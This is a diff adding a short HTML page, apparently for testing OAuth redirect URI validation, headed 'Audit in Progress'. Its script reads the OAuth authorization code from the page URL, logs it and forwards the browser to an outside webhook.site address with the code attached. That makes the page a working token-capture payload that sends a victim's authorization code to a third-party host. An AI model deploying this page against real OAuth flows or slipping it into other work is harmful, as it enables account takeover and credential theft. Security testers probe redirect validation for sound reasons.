@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Forge Vertical - Audit Handshake</title>
+</head>
+<body>
+    <h1>Audit in Progress...</h1>
+    <p>If you are seeing this, the Redirect URI validation has failed.</p>
+    <script>
+        // This script grabs the 'code' or 'access_token' from the URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const code = urlParams.get('code');
+        if (code) {
+            console.log("Captured Code: " + code);
+            // Optional: Auto-forward to your webhook for logging
+            window.location.href = "https://webhook.site/7f9c8926-c9df-44ee-9350-db06430369aa?captured_code=" + code;
+        }
+    </script>
+</body>
+</html>
